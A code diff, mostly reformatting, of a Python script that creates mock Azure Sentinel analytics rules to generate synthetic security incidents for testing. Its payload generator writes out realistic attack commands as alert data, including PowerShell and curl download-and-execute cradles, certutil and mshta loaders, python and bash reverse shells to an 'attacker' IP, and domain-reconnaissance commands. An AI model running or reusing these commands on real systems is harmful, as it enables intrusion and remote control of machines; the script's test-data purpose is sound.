@@ -1,21 +1,24 @@
-import uuid
-import logging
 import base64
+import json
+import logging
 import random
 import urllib.parse
-import json
-from sentinel_api import _request, _get_base, API_VERSION
-from sentinel_auth import get_auth_headers
+import uuid
+
 from dotenv import load_dotenv
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+from sentinel_api import API_VERSION, _get_base, _request
+from sentinel_auth import get_auth_headers
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 logger = logging.getLogger(__name__)
 
 CAMPAIGN_SHARED_IOCS = {
     "c2_domain": "api.github-user-content.com",
-    "attacker_ip": "45.33.32.156", # Scanme Nmap
-    "malicious_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" # Example hash
+    "attacker_ip": "45.33.32.156",  # Scanme Nmap
+    "malicious_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",  # Example hash
 }
+
 
 def generate_obfuscated_payload(ip: str, domain: str, profile: list[int]) -> str:
     """
@@ -29,65 +32,118 @@ def generate_obfuscated_payload(ip: str, domain: str, profile: list[int]) -> str
     Returns:
         The generated mock payload string.
     """
+
     def p1():
         cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{domain}/malware.ps1')"
         return f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {base64.b64encode(cmd.encode()).decode()}"
+
     def p2():
-        parts = ip.split('.')
+        parts = ip.split(".")
         return f"curl -A 'Mozilla/5.0' http://0x{int(parts[0]):02x}.0x{int(parts[1]):02x}.0x{int(parts[2]):02x}.0x{int(parts[3]):02x}/stage2.sh | bash"
+
     def p3():
         return f"cmd.exe /c certutil.exe -urlcache -split -f https://{domain}/update.exe %TEMP%\\svchost.exe && %TEMP%\\svchost.exe"
+
     def p4():
-        parts = ip.split('.')
-        dec_ip = (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
+        parts = ip.split(".")
+        dec_ip = (
+            (int(parts[0]) << 24)
+            + (int(parts[1]) << 16)
+            + (int(parts[2]) << 8)
+            + int(parts[3])
+        )
         return f"wget http://{dec_ip}/config.json -O /tmp/config.json"
+
     def p5():
-        cmd = f"Invoke-WebRequest -Uri http://{domain}/shell.exe -OutFile $env:TEMP\\shell.exe"[::-1]
+        cmd = f"Invoke-WebRequest -Uri http://{domain}/shell.exe -OutFile $env:TEMP\\shell.exe"[
+            ::-1
+        ]
         return f"powershell -c \"$rev='{cmd}'; $cmd=-join($rev.ToCharArray()|Reverse); Invoke-Expression $cmd\""
+
     def p6():
-        return f"wmic /node:{ip} process call create \"regsvr32.exe /s /n /u /i:http://{domain}/payload.sct scrobj.dll\""
+        return f'wmic /node:{ip} process call create "regsvr32.exe /s /n /u /i:http://{domain}/payload.sct scrobj.dll"'
+
     def p7():
-        return f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+        return f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{ip}",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''
+
     def p8():
-        return f"mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://{domain}/macro.vbs\"\")\"))"
+        return f'mshta.exe vbscript:Close(Execute("GetObject(""script:http://{domain}/macro.vbs"")"))'
+
     def p9():
-        return f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://{domain}/payload.wsc\").Exec();"
+        return f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://{domain}/payload.wsc").Exec();'
+
     def p10():
         return f"bash -c 'exec 5<>/dev/tcp/{ip}/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'"
+
     def p11():
         return "A" * 4000 + " | grep something"
+
     def p12():
         return "nltest /domain_trusts"
+
     def p13():
-        return "net group \"Domain Admins\" /domain"
+        return 'net group "Domain Admins" /domain'
+
     def p14():
         return "whoami /all"
-    def p15():
-        return f"https://{domain}/personal/user_documents/Shared/Project_X_Financials.xlsx"
 
-    payloads = {1: p1, 2: p2, 3: p3, 4: p4, 5: p5, 6: p6, 7: p7, 8: p8, 9: p9, 10: p10, 11: p11, 12: p12, 13: p13, 14: p14, 15: p15}
-    
+    def p15():
+        return (
+            f"https://{domain}/personal/user_documents/Shared/Project_X_Financials.xlsx"
+        )
+
+    payloads = {
+        1: p1,
+        2: p2,
+        3: p3,
+        4: p4,
+        5: p5,
+        6: p6,
+        7: p7,
+        8: p8,
+        9: p9,
+        10: p10,
+        11: p11,
+        12: p12,
+        13: p13,
+        14: p14,
+        15: p15,
+    }
+
     if not profile:
         return ""
-        
+
     choice = random.choice(profile)
     return payloads[choice]()
+
 
 # Domains & IPs
 PUNYCODE_DOMAINS = ["xn--googl-fsa.com", "xn--microsft-zxa.com", "xn--paypa-m1a.com"]
 LEGIT_DOMAINS = ["microsoft.com", "sharepoint.com", "onedrive.live.com"]
 RANDOM_DOMAINS = [
-    "rnicrosoft-update.com", "azure-auth-sso.net",
+    "rnicrosoft-update.com",
+    "azure-auth-sso.net",
     "login.microsoftonline.com.secure-auth-xyz.info",
-    "windows-defender-update.xyz", "aws-s3-bucket-storage.net", 
-    "cloudflare-cdn-delivery.org", "slack-api-webhook.com", "zoom-video-confernce.net"
+    "windows-defender-update.xyz",
+    "aws-s3-bucket-storage.net",
+    "cloudflare-cdn-delivery.org",
+    "slack-api-webhook.com",
+    "zoom-video-confernce.net",
 ]
 
 HOSTNAMES = [
-    "DESKTOP-A1B2C3D", "SRV-DC-01", "HR-WKSTN-404", "EXCHANGE-PROD", 
-    "SQL-CLUSTER-02", "DEV-LINUX-BUILD", "DMZ-WEBSERVER-1", 
-    "CEO-LAPTOP-MAC", "KUBERNETES-NODE-3", "DOCKER-HOST-ALPHA"
+    "DESKTOP-A1B2C3D",
+    "SRV-DC-01",
+    "HR-WKSTN-404",
+    "EXCHANGE-PROD",
+    "SQL-CLUSTER-02",
+    "DEV-LINUX-BUILD",
+    "DMZ-WEBSERVER-1",
+    "CEO-LAPTOP-MAC",
+    "KUBERNETES-NODE-3",
+    "DOCKER-HOST-ALPHA",
 ]
+
 
 def generate_random_ip(is_internal=False):
     """
@@ -102,6 +158,7 @@ def generate_random_ip(is_internal=False):
     if is_internal:
         return f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
     return f"{random.randint(11, 200)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
 
 SCENARIOS = [
     {
@@ -124,7 +181,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": RANDOM_DOMAINS,
         "alert_count": 10,
-        "special": None
+        "special": None,
     },
     {
         "id": 2,
@@ -147,7 +204,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": PUNYCODE_DOMAINS,
         "alert_count": 10,
-        "special": None
+        "special": None,
     },
     {
         "id": 3,
@@ -169,7 +226,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": RANDOM_DOMAINS,
         "alert_count": 10,
-        "special": None
+        "special": None,
     },
     {
         "id": 4,
@@ -192,7 +249,7 @@ SCENARIOS = [
         "ip_mode": "internal",
         "domain_pool": LEGIT_DOMAINS,
         "alert_count": 10,
-        "special": None
+        "special": None,
     },
     {
         "id": 5,
@@ -214,7 +271,7 @@ SCENARIOS = [
         "ip_mode": "internal",
         "domain_pool": [""],
         "alert_count": 10,
-        "special": None
+        "special": None,
     },
     {
         "id": 6,
@@ -237,7 +294,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": RANDOM_DOMAINS,
         "alert_count": 2,
-        "special": "malformed"
+        "special": "malformed",
     },
     {
         "id": 7,
@@ -260,7 +317,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": [""],
         "alert_count": 10,
-        "special": "zero_entity"
+        "special": "zero_entity",
     },
     {
         "id": 8,
@@ -282,7 +339,7 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
         "alert_count": 10,
-        "special": "campaign_1"
+        "special": "campaign_1",
     },
     {
         "id": 9,
@@ -299,13 +356,18 @@ SCENARIOS = [
             "against two domain controllers that are not in the account's normal authentication scope."
         ),
         "severity": "High",
-        "tactics": ["LateralMovement", "CredentialAccess", "Persistence", "PrivilegeEscalation"],
+        "tactics": [
+            "LateralMovement",
+            "CredentialAccess",
+            "Persistence",
+            "PrivilegeEscalation",
+        ],
         "entity_mappings": ["IP", "Host", "FileHash", "DNS"],
         "obfuscation_profile": [6, 2],
         "ip_mode": "mixed",
         "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
         "alert_count": 10,
-        "special": "campaign_2"
+        "special": "campaign_2",
     },
     {
         "id": 10,
@@ -330,9 +392,10 @@ SCENARIOS = [
         "ip_mode": "public",
         "domain_pool": [CAMPAIGN_SHARED_IOCS["c2_domain"]],
         "alert_count": 10,
-        "special": "campaign_3"
-    }
+        "special": "campaign_3",
+    },
 ]
+
 
 def generate_scenario_datatable(scenario: dict) -> str:
     """
@@ -345,7 +408,7 @@ def generate_scenario_datatable(scenario: dict) -> str:
         A KQL string containing the mock event data.
     """
     rows = []
-    
+
     if scenario["special"] == "zero_entity":
         narratives = [
             "UEBA: Session anomaly score 87/100. Logon duration 4.1h vs 1.2h baseline (3.2σ). Resource category 'Azure Key Vault Secrets' accessed for first time. Browser fingerprint changed mid-session (canvas hash delta). MFA push accepted in 0.8s.",
@@ -357,11 +420,11 @@ def generate_scenario_datatable(scenario: dict) -> str:
             "UEBA: Lateral account usage. Service account SPN was used for interactive logon for the first time. Kerberos TGT requested from a workstation not in the accounts authorized host list. Account is flagged as Tier-0 asset.",
             "UEBA: Consent grant anomaly. User consented to a third-party OAuth application requesting Mail.ReadWrite and Files.ReadWrite.All scopes. Application publisher is unverified. Tenant policy allows user consent for low-risk apps only.",
             "UEBA: Geofence violation. Authentication from IP geolocating to embargoed jurisdiction. User has active conditional access policy blocking this region but authentication succeeded via legacy protocol bypass (ActiveSync).",
-            "UEBA: MFA fatigue pattern. 14 MFA push notifications sent in 3 minutes. 13 denied, 1 approved. Approved notification originated from a different device than the authentication request source."
+            "UEBA: MFA fatigue pattern. 14 MFA push notifications sent in 3 minutes. 13 denied, 1 approved. Approved notification originated from a different device than the authentication request source.",
         ]
         for i in range(scenario["alert_count"]):
             narrative = narratives[i % len(narratives)]
-            narrative_escaped = narrative.replace('\\', '\\\\').replace("'", "\\'")
+            narrative_escaped = narrative.replace("\\", "\\\\").replace("'", "\\'")
             rows.append(f"now(), '', '', '', '', '', '{narrative_escaped}'")
     else:
         for _ in range(scenario["alert_count"]):
@@ -369,34 +432,50 @@ def generate_scenario_datatable(scenario: dict) -> str:
                 ip = generate_random_ip(is_internal=False)
             elif scenario["ip_mode"] == "internal":
                 ip = generate_random_ip(is_internal=True)
-            else: # mixed
+            else:  # mixed
                 ip = generate_random_ip(is_internal=random.choice([True, False]))
-                
+
             if scenario.get("special") and scenario["special"].startswith("campaign"):
-                ip = CAMPAIGN_SHARED_IOCS["attacker_ip"] if random.random() > 0.5 else ip
+                ip = (
+                    CAMPAIGN_SHARED_IOCS["attacker_ip"] if random.random() > 0.5 else ip
+                )
                 hash_val = CAMPAIGN_SHARED_IOCS["malicious_hash"]
                 domain = CAMPAIGN_SHARED_IOCS["c2_domain"]
             else:
                 hash_val = "".join(random.choices("0123456789abcdef", k=64))
-                domain = random.choice(scenario["domain_pool"]) if scenario["domain_pool"] else ""
-                
+                domain = (
+                    random.choice(scenario["domain_pool"])
+                    if scenario["domain_pool"]
+                    else ""
+                )
+
             hostname = random.choice(HOSTNAMES)
             if scenario["special"] == "malformed":
-                hostname += " \U0001f600\U0001f4a9 malformed_" + "".join(random.choices("!@#$%^&*()", k=5))
-                
-            payload = generate_obfuscated_payload(ip, domain, scenario["obfuscation_profile"])
+                hostname += " \U0001f600\U0001f4a9 malformed_" + "".join(
+                    random.choices("!@#$%^&*()", k=5)
+                )
+
+            payload = generate_obfuscated_payload(
+                ip, domain, scenario["obfuscation_profile"]
+            )
             if scenario["special"] == "malformed":
-                payload = base64.b64encode(urllib.parse.quote(payload).encode()).decode() + "GARBAGE_" * 50
-                
-            payload_escaped = payload.replace('\\', '\\\\').replace("'", "\\'")
-            
-            rows.append(f"now(), '{ip}', '{hostname}', 'SHA256', '{hash_val}', '{domain}', '{payload_escaped}'")
-            
+                payload = (
+                    base64.b64encode(urllib.parse.quote(payload).encode()).decode()
+                    + "GARBAGE_" * 50
+                )
+
+            payload_escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
+
+            rows.append(
+                f"now(), '{ip}', '{hostname}', 'SHA256', '{hash_val}', '{domain}', '{payload_escaped}'"
+            )
+
     kql = (
         "let events = datatable(TimeGenerated:datetime, AttackerIP:string, TargetHost:string, HashType:string, MaliciousHash:string, C2Domain:string, EncodedPayload:string)\n"
         "[\n    " + ",\n    ".join(rows) + "\n];\nevents"
     )
     return kql
+
 
 def build_rule_body(scenario: dict, rule_id: str, kql_query: str) -> dict:
     """
@@ -411,77 +490,93 @@ def build_rule_body(scenario: dict, rule_id: str, kql_query: str) -> dict:
         A dictionary representing the JSON payload for the Azure Sentinel API.
     """
     entity_mappings = []
-    
+
     if "IP" in scenario["entity_mappings"]:
-        entity_mappings.append({
-            "entityType": "IP",
-            "fieldMappings": [{"identifier": "Address", "columnName": "AttackerIP"}]
-        })
+        entity_mappings.append(
+            {
+                "entityType": "IP",
+                "fieldMappings": [
+                    {"identifier": "Address", "columnName": "AttackerIP"}
+                ],
+            }
+        )
     if "Host" in scenario["entity_mappings"]:
-        entity_mappings.append({
-            "entityType": "Host",
-            "fieldMappings": [{"identifier": "HostName", "columnName": "TargetHost"}]
-        })
+        entity_mappings.append(
+            {
+                "entityType": "Host",
+                "fieldMappings": [
+                    {"identifier": "HostName", "columnName": "TargetHost"}
+                ],
+            }
+        )
     if "FileHash" in scenario["entity_mappings"]:
-        entity_mappings.append({
-            "entityType": "FileHash",
-            "fieldMappings": [{"identifier": "Algorithm", "columnName": "HashType"}, {"identifier": "Value", "columnName": "MaliciousHash"}]
-        })
+        entity_mappings.append(
+            {
+                "entityType": "FileHash",
+                "fieldMappings": [
+                    {"identifier": "Algorithm", "columnName": "HashType"},
+                    {"identifier": "Value", "columnName": "MaliciousHash"},
+                ],
+            }
+        )
     if "DNS" in scenario["entity_mappings"]:
-        entity_mappings.append({
-            "entityType": "DNS",
-            "fieldMappings": [{"identifier": "DomainName", "columnName": "C2Domain"}]
-        })
+        entity_mappings.append(
+            {
+                "entityType": "DNS",
+                "fieldMappings": [
+                    {"identifier": "DomainName", "columnName": "C2Domain"}
+                ],
+            }
+        )
     if "Account" in scenario["entity_mappings"]:
-        entity_mappings.append({
-            "entityType": "Account",
-            "fieldMappings": [{"identifier": "Name", "columnName": "TargetHost"}]
-        })
-        
+        entity_mappings.append(
+            {
+                "entityType": "Account",
+                "fieldMappings": [{"identifier": "Name", "columnName": "TargetHost"}],
+            }
+        )
+
+    properties: dict = {
+        "displayName": scenario["name"],
+        "description": scenario["description"],
+        "severity": scenario["severity"],
+        "enabled": True,
+        "query": kql_query,
+        "queryFrequency": "PT5M",
+        "queryPeriod": "PT5M",
+        "triggerOperator": "GreaterThan",
+        "triggerThreshold": 0,
+        "suppressionDuration": "PT5H",
+        "suppressionEnabled": False,
+        "tactics": scenario["tactics"],
+        "incidentConfiguration": {
+            "createIncident": True,
+            "groupingConfiguration": {
+                "enabled": True,
+                "reopenClosedIncident": False,
+                "lookbackDuration": "PT5M",
+                "matchingMethod": "AnyAlert",
+                "groupByEntities": [],
+                "groupByAlertDetails": [],
+                "groupByCustomDetails": [],
+            },
+        },
+        "eventGroupingSettings": {"aggregationKind": "AlertPerResult"},
+        "customDetails": {"EncodedPayload": "EncodedPayload"},
+        "alertDetailsOverride": {
+            "alertDisplayNameFormat": f"{scenario['name']} — {{{{TargetHost}}}}",
+            "alertDescriptionFormat": "Observed payload on affected host:\\n{{EncodedPayload}}",
+        },
+    }
+
+    if entity_mappings:
+        properties["entityMappings"] = entity_mappings
+
     body = {
         "kind": "Scheduled",
-        "properties": {
-            "displayName": scenario["name"],
-            "description": scenario["description"],
-            "severity": scenario["severity"],
-            "enabled": True,
-            "query": kql_query,
-            "queryFrequency": "PT5M",
-            "queryPeriod": "PT5M",
-            "triggerOperator": "GreaterThan",
-            "triggerThreshold": 0,
-            "suppressionDuration": "PT5H",
-            "suppressionEnabled": False,
-            "tactics": scenario["tactics"],
-            "incidentConfiguration": {
-                "createIncident": True,
-                "groupingConfiguration": {
-                    "enabled": True,
-                    "reopenClosedIncident": False,
-                    "lookbackDuration": "PT5M",
-                    "matchingMethod": "AnyAlert",
-                    "groupByEntities": [],
-                    "groupByAlertDetails": [],
-                    "groupByCustomDetails": []
-                }
-            },
-            "eventGroupingSettings": {
-                "aggregationKind": "AlertPerResult"
-            },
-            "entityMappings": entity_mappings,
-            "customDetails": {
-                "EncodedPayload": "EncodedPayload"
-            },
-            "alertDetailsOverride": {
-                "alertDisplayNameFormat": f"{scenario['name']} — {{{{TargetHost}}}}",
-                "alertDescriptionFormat": "Observed payload on affected host:\\n{{EncodedPayload}}"
-            }
-        }
+        "properties": properties,
     }
-    
-    if not entity_mappings:
-        del body["properties"]["entityMappings"]
-        
+
     return body
 
 
@@ -494,9 +589,9 @@ def create_mock_incidents():
     """
     load_dotenv()
     headers = get_auth_headers()
-    
+
     logger.info("Initializing creation of 10 Scenario-Driven Analytics Rules...")
-    
+
     for scenario in SCENARIOS:
         rule_id = str(uuid.uuid4())
         try:
@@ -504,30 +599,41 @@ def create_mock_incidents():
         except EnvironmentError as e:
             logger.error(e)
             return
-            
+
         params = {"api-version": "2023-02-01"}
         kql_query = generate_scenario_datatable(scenario)
         body = build_rule_body(scenario, rule_id, kql_query)
-        
+
         try:
             response = _request("PUT", url, headers=headers, params=params, json=body)
             if response.status_code in (200, 201):
                 logger.info(f"✅ Created Rule {scenario['id']}: {scenario['name']}")
             else:
-                logger.error(f"❌ Failed to create Rule {scenario['id']}. Status: {response.status_code}")
+                logger.error(
+                    f"❌ Failed to create Rule {scenario['id']}. Status: {response.status_code}"
+                )
                 logger.error(response.text)
         except Exception as e:
             logger.error(f"❌ Failed to create Rule {scenario['id']}: {e}")
-            resp = getattr(e, 'response', None)
+            resp = getattr(e, "response", None)
             if resp is not None:
                 logger.error(f"Response body: {resp.text}")
 
-    logger.info("\\n" + "="*80)
-    logger.info("🎯 All 10 Scenario Analytics Rules have been successfully created via the Sentinel REST API!")
-    logger.info("⚙️ Mechanism: Sentinel executes Scheduled Analytics Rules every 5 minutes.")
-    logger.info("⏳ Wait ~5 minutes. Sentinel will run these rules and native Incidents will magically appear.")
-    logger.info("⚠️ WARNING: These rules will fire every 5 minutes. Delete them in 'Sentinel > Analytics' when done.")
-    logger.info("="*80)
+    logger.info("\\n" + "=" * 80)
+    logger.info(
+        "🎯 All 10 Scenario Analytics Rules have been successfully created via the Sentinel REST API!"
+    )
+    logger.info(
+        "⚙️ Mechanism: Sentinel executes Scheduled Analytics Rules every 5 minutes."
+    )
+    logger.info(
+        "⏳ Wait ~5 minutes. Sentinel will run these rules and native Incidents will magically appear."
+    )
+    logger.info(
+        "⚠️ WARNING: These rules will fire every 5 minutes. Delete them in 'Sentinel > Analytics' when done."
+    )
+    logger.info("=" * 80)
+
 
 if __name__ == "__main__":
     create_mock_incidents()
